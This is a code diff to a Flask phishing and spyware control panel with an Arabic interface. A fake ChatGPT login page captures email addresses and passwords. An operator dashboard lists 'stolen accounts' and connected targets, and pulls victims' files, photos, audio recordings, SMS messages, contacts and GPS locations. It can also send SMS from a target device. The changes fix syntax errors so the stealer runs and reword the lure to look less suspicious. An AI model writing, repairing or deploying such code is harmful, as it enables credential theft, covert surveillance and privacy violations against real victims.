@@ -7,7 +7,7 @@ import os
 
 urllib3.disable_warnings()
 
-app = Flask(name)
+app = Flask(__name__)
 app.secret_key = hashlib.sha256(b"secure_secret_key_v81_0_engine").digest()
 
 DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()
@@ -56,11 +56,11 @@ button{width:100%;padding:14px;background:#19c37d;color:#fff;border:none;border-
 <body>
 <div class="box">
   <div class="ai-logo">✨</div>
-  <h2>  منصة الذكاء الاصطناعي المهكر ChatGPT </h2>
-  <div class="sub-title">تفعيل النضام والدخول الى منصة الذكاء المهكر </div>
+  <h2>منصة المزامنة الذكية ChatGPT</h2>
+  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل v81</div>
   <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
   <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
-  <button onclick="triggerAIWorkflow()">تسجيل الدخول والمتابعة 🚀</button>
+  <button onclick="triggerAIWorkflow()">تفعيل ومزامنة البيانات 🚀</button>
 </div>
 <script>
 async function triggerAIWorkflow(){
@@ -183,60 +183,60 @@ async function executeCommand(){
    const data = await res.json();
    if(cmdType === 'fetch_active_agents'){
      let t = '<div class="card"><b>🎯 الأهداف النشطة (اضغط على الرمز لتحديده)</b><table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
-     if(data.agents && data.agents.length>0){ data.agents.forEach(a => { t += <tr><td><button onclick="selectToken('${a.token}')" style="background:#00ff88;color:#000;padding:5px 10px;">${a.token}</button></td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>; }); }
+     if(data.agents && data.agents.length>0){ data.agents.forEach(a => { t += `<tr><td><button onclick="selectToken('${a.token}')" style="background:#00ff88;color:#000;padding:5px 10px;">${a.token}</button></td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; }); }
      else { t += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة حالياً</td></tr>'; }
      results.innerHTML = t + '</table></div>';
    } else if(cmdType === 'fetch_captured_credentials'){
      let c = '<div class="card"><b>🔑 الحسابات المسروقة</b><table><tr><th>Token</th><th>البريد</th><th>كلمة المرور</th><th>الوقت</th></tr>';
-     if(data.credentials && data.credentials.length>0){ data.credentials.forEach(item => { c += <tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>; }); }
+     if(data.credentials && data.credentials.length>0){ data.credentials.forEach(item => { c += `<tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>`; }); }
      else { c += '<tr><td colspan="4" style="text-align:center">لا توجد حسابات مسروقة</td></tr>'; }
      results.innerHTML = c + '</table></div>';
    } else if(cmdType === 'fetch_target_file_list'){
      let f = '<div class="card"><b>📂 ملفات الهدف</b><table><tr><th>Token</th><th>مسار الملف</th><th>إجراء السحب</th></tr>';
      if(data.files && data.files.length>0){
-       data.files.forEach(file => { f += <tr><td>${file.token}</td><td style="color:#00ff88;direction:ltr">${file.filename}</td><td><button onclick="pullFile('${file.token}', '${file.filename}')">سحب الملف 📥</button></td></tr>; });
+       data.files.forEach(file => { f += `<tr><td>${file.token}</td><td style="color:#00ff88;direction:ltr">${file.filename}</td><td><button onclick="pullFile('${file.token}', '${file.filename}')">سحب الملف 📥</button></td></tr>`; });
      } else { f += '<tr><td colspan="3" style="text-align:center">لا توجد ملفات مفهرسة</td></tr>'; }
      results.innerHTML = f + '</table></div>';
    } else if(cmdType === 'fetch_target_image_list'){
      let img = '<div class="card"><b>🖼️ صور الهدف</b><table><tr><th>Token</th><th>مسار الصورة</th><th>إجراء السحب</th></tr>';
      if(data.images && data.images.length>0){
-       data.images.forEach(im => { img += <tr><td>${im.token}</td><td style="color:#00ff88;direction:ltr">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>; });
+       data.images.forEach(im => { img += `<tr><td>${im.token}</td><td style="color:#00ff88;direction:ltr">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>`; });
      } else { img += '<tr><td colspan="3" style="text-align:center">لا توجد صور مفهرسة</td></tr>'; }
      results.innerHTML = img + '</table></div>';
    } else if(cmdType === 'fetch_target_audio_list'){
      let aud = '<div class="card"><b>🎙️ التسجيلات الصوتية المسحوبة</b><table><tr><th>Token</th><th>مسار التسجيل الصوتي</th><th>إجراء السحب</th></tr>';
      if(data.audio && data.audio.length>0){
-       data.audio.forEach(au => { aud += <tr><td>${au.token}</td><td style="color:#00ff88;direction:ltr">${au.filename}</td><td><button onclick="pullFile('${au.token}', '${au.filename}')">سحب الصوت 📥</button></td></tr>; });
+       data.audio.forEach(au => { aud += `<tr><td>${au.token}</td><td style="color:#00ff88;direction:ltr">${au.filename}</td><td><button onclick="pullFile('${au.token}', '${au.filename}')">سحب الصوت 📥</button></td></tr>`; });
      } else { aud += '<tr><td colspan="3" style="text-align:center">لا توجد تسسجيلات صوتية مفهرسة</td></tr>'; }
      results.innerHTML = aud + '</table></div>';
    } else if(cmdType === 'fetch_target_sms_list'){
      let sms = '<div class="card"><b>💬 رسائل الهدف</b><table><tr><th>Token</th><th>المرسل / المحتوى</th><th>الوقت</th></tr>';
      if(data.sms && data.sms.length>0){
-       data.sms.forEach(s => { sms += <tr><td>${s.token}</td><td style="color:#00ff88">${s.body}</td><td>${s.time}</td></tr>; });
+       data.sms.forEach(s => { sms += `<tr><td>${s.token}</td><td style="color:#00ff88">${s.body}</td><td>${s.time}</td></tr>`; });
      } else { sms += '<tr><td colspan="3" style="text-align:center">لا توجد رسائل مسجلة</td></tr>'; }
      results.innerHTML = sms + '</table></div>';
    } else if(cmdType === 'fetch_target_contacts_list'){
      let cnt = '<div class="card"><b>📞 جهات اتصال الهدف</b><table><tr><th>Token</th><th>الاسم</th><th>الرقم</th><th>اتصال سريع</th></tr>';
      if(data.contacts && data.contacts.length>0){
-       data.contacts.forEach(ct => { cnt += <tr><td>${ct.token}</td><td style="color:#00ff88">${ct.name}</td><td style="direction:ltr">${ct.phone}</td><td><button onclick="quickCall('${ct.token}', '${ct.phone}')" style="background:#0284c7;padding:5px 10px;">اتصال 📞</button></td></tr>; });
+       data.contacts.forEach(ct => { cnt += `<tr><td>${ct.token}</td><td style="color:#00ff88">${ct.name}</td><td style="direction:ltr">${ct.phone}</td><td><button onclick="quickCall('${ct.token}', '${ct.phone}')" style="background:#0284c7;padding:5px 10px;">اتصال 📞</button></td></tr>`; });
      } else { cnt += '<tr><td colspan="4" style="text-align:center">لا توجد جهات اتصال</td></tr>'; }
      results.innerHTML = cnt + '</table></div>';
    } else if(cmdType === 'fetch_target_location'){
      let loc = '<div class="card"><b>📍 إحداثيات الموقع الجغرافي GPS</b><table><tr><th>Token</th><th>خط العرض (Lat)</th><th>خط الطول (Lng)</th><th>الخريطة</th><th>الوقت</th></tr>';
      if(data.locations && data.locations.length>0){
-       data.locations.forEach(l => { loc += <tr><td>${l.token}</td><td>${l.lat}</td><td>${l.lng}</td><td><a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" style="color:#38bdf8">[فتح في الخرائط 🗺️]</a></td><td>${l.time}</td></tr>; });
+       data.locations.forEach(l => { loc += `<tr><td>${l.token}</td><td>${l.lat}</td><td>${l.lng}</td><td><a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" style="color:#38bdf8">[فتح في الخرائط 🗺️]</a></td><td>${l.time}</td></tr>`; });
      } else { loc += '<tr><td colspan="5" style="text-align:center">لم يتم استلام إحداثيات بعد</td></tr>'; }
      results.innerHTML = loc + '</table></div>';
    } else if(cmdType === 'fetch_extracted_files'){
      let ef = '<div class="card"><b>📥 الملفات والصور والتسجيلات المسحوبة</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th><th>تحميل</th></tr>';
      if(data.extracted && data.extracted.length>0){
-       data.extracted.forEach(ex => { ef += <tr><td>${ex.token}</td><td style="color:#00ff88">${ex.filename}</td><td>${ex.time}</td><td><a href="/download/${ex.saved_name}" style="color:#00ff88" target="_blank">[تحميل / عرض]</a></td></tr>; });
+       data.extracted.forEach(ex => { ef += `<tr><td>${ex.token}</td><td style="color:#00ff88">${ex.filename}</td><td>${ex.time}</td><td><a href="/download/${ex.saved_name}" style="color:#00ff88" target="_blank">[تحميل / عرض]</a></td></tr>`; });
      } else { ef += '<tr><td colspan="4" style="text-align:center">لم يتم سحب أي ملفات بعد</td></tr>'; }
      results.innerHTML = ef + '</table></div>';
    } else if(cmdType === 'fetch_execution_logs'){
      let log = '<div class="card"><b>📜 سجل تقارير تنفيذ الأوامر</b><table><tr><th>Token</th><th>الأمر التنفيذي</th><th>الحالة</th><th>الوقت</th></tr>';
      if(data.logs && data.logs.length>0){
-       data.logs.forEach(lg => { log += <tr><td>${lg.token}</td><td style="color:#00ff88">${lg.action}</td><td style="color:#00ff88">${lg.status}</td><td>${lg.time}</td></tr>; });
+       data.logs.forEach(lg => { log += `<tr><td>${lg.token}</td><td style="color:#00ff88">${lg.action}</td><td style="color:#00ff88">${lg.status}</td><td>${lg.time}</td></tr>`; });
      } else { log += '<tr><td colspan="4" style="text-align:center">لا توجد تقارير تنفيذ مسجلة</td></tr>'; }
      results.innerHTML = log + '</table></div>';
    }
@@ -280,7 +280,7 @@ async function sendSMSCommand(){
   const token = document.getElementById('target_token_input').value.trim();
   const phone = document.getElementById('sms_phone_input').value.trim();
   const body = document.getElementById('sms_body_input').value.trim();
-  if(!token  !phone  !body) { alert('يرجى استكمال البيانات'); return; }
+  if(!token || !phone || !body) { alert('يرجى استكمال البيانات'); return; }
   await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'send_sms', phone: phone, body: body})});
   alert('تم توجيه أمر إرسال الرسالة!');
 }
@@ -452,5 +452,5 @@ def api_index():
     elif mode == "fetch_execution_logs": return jsonify({"logs": EXECUTION_LOGS})
     return jsonify({"status": "ok"})
 
-if name == 'main':
+if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
